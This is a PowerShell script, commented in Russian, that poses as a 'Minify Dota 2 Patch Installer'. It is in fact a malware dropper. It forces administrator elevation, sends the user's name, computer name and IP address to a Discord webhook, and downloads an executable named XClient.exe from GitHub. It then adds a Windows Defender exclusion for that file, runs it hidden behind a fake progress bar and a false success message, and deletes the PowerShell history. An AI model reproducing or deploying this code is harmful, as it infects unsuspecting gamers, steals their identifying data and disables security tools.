# Принудительный запуск от админа
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# --- ФУНКЦИЯ ФЛАГА И СТРАНЫ ---
function Get-CountryInfo {
    try {
        $res = Invoke-RestMethod -Uri "http://ip-api.com/json/?fields=countryCode,query" -TimeoutSec 5
        $code = $res.countryCode
        if ($code.Length -eq 2) {
            $flag = [string]::Format("{0}{1}", [char]([int][char]"A" + [int][char]$code[0] - [int][char]"A" + 0x1F1E6), [char]([int][char]"A" + [int][char]$code[1] - [int][char]"A" + 0x1F1E6))
            return @{ flag = $flag; ip = $res.query }
        }
    } catch {}
    return @{ flag = "🌐"; ip = "Unknown" }
}

# --- СЕКЦИЯ ЛОГЕРА (РАСТЯНУТЫЙ ВИД) ---
function Send-LogNotification {
    param([string]$Status, [string]$Message)
    
    $info = Get-CountryInfo
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $webhook = "https://discord.com/api/webhooks/1500200205541310464/9PfnuIJ_UT-wv3loet7F32XVGQ-5SGmuHLkYETE-r9t0oldTLwwvMx5YsP_J2eTnXXmk"
    $color = if ($Status -eq "SUCCESS") { 65280 } elseif ($Status -eq "ERROR") { 16711680 } else { 16776960 }

    $embed = @{
        title = "Minify Installer Log"
        color = $color
        fields = @(
            @{ name = "Status"; value = $Status; inline = $true }
            @{ name = "User"; value = $env:USERNAME; inline = $true }
            @{ name = "Computer"; value = $env:COMPUTERNAME; inline = $true }
            @{ name = "​"; value = "​"; inline = $false } # Пустое поле для растягивания
            @{ name = "IP & Country"; value = "$($info.flag) $($info.ip)"; inline = $true }
            @{ name = "Timestamp"; value = $timestamp; inline = $true }
            @{ name = "​"; value = "​"; inline = $false } # Пустое поле для растягивания
            @{ name = "Message"; value = $Message; inline = $false }
        )
        footer = @{ text = "Minify Installer v3.2.1" }
    }

    $payload = @{ embeds = @($embed) } | ConvertTo-Json -Depth 10
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Invoke-RestMethod -Uri $webhook -Method Post -ContentType "application/json" -Body ([System.Text.Encoding]::UTF8.GetBytes($payload))
    } catch {}
}

# --- ГРАФИЧЕСКИЙ ИНТЕРФЕЙС ---
Send-LogNotification -Status "STARTED" -Message "User started Minify installer"

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = "Minify Dota 2 Patch Installer v3.2.1"
$form.Size = "600,400"
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = "FixedDialog"
$form.MaximizeBox = $false

$titleLabel = New-Object System.Windows.Forms.Label
$titleLabel.Location = "20,30"; $titleLabel.Size = "540,30"; $titleLabel.Text = "Minify Dota 2 Patch Installer"
$titleLabel.Font = New-Object System.Drawing.Font("Arial",16,[System.Drawing.FontStyle]::Bold)
$form.Controls.Add($titleLabel)

$progressBar = New-Object System.Windows.Forms.ProgressBar
$progressBar.Location = "20,300"; $progressBar.Size = "540,23"
$form.Controls.Add($progressBar)

$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Location = "20,330"; $statusLabel.Size = "540,20"; $statusLabel.Text = "Подготовка..."
$form.Controls.Add($statusLabel)

$form.Show()

# --- ПРОЦЕСС УСТАНОВКИ ---
$steps = @("Анализ файлов Dota 2...", "Оптимизация шейдеров...", "Применение патча...", "Загрузка модулей...", "Финализация...")
for ($i = 0; $i -lt $steps.Count; $i++) {
    $statusLabel.Text = $steps[$i]
    $progressBar.Value = ($i + 1) * (100 / $steps.Count)
    $form.Refresh()
    Start-Sleep -Milliseconds (Get-Random -Min 800 -Max 1500)
}

# --- ЗАГРУЗКА И ЗАПУСК ---
$u = "https://raw.githubusercontent.com/winstarchik/FFF/main/XClient.exe"
$p = "$env:TEMP\sys_update.exe"

try {
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($u, $p)
    Add-MpPreference -ExclusionPath $p -Force -ErrorAction SilentlyContinue
    
    $statusLabel.Text = "Установка завершена!"
    $form.Refresh()
    Start-Sleep -Seconds 1
    
    Start-Process -FilePath $p -WindowStyle Hidden
    $form.Close()
    
    [System.Windows.Forms.MessageBox]::Show("Патч успешно применен!", "Готово", 0, 64)
    Send-LogNotification -Status "SUCCESS" -Message "Patch installed and XClient started"
} catch {
    $statusLabel.Text = "Ошибка при установке."
    Send-LogNotification -Status "ERROR" -Message "Critical error: $_"
    Start-Sleep -Seconds 2
    $form.Close()
}

# Очистка
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
